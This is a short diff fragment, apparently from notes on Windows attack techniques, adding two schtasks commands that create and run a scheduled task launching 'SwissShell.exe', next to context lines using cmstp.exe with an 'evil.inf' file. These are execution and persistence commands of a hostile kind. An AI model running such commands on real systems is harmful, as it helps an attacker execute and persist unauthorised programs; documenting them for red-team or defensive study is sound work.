@@ -109,5 +109,8 @@ cmstp.exe /s C:\MyFolder\evil.inf
   shell.Run("notepad.exe");
 </script>
 
+schtasks /create /tn "SwissKnifeyTask" /tr "C:\MyFolder\SwissShell.exe" /sc once /st 00:00
+schtasks /run /tn "SwissKnifeyTask"
+
 
 
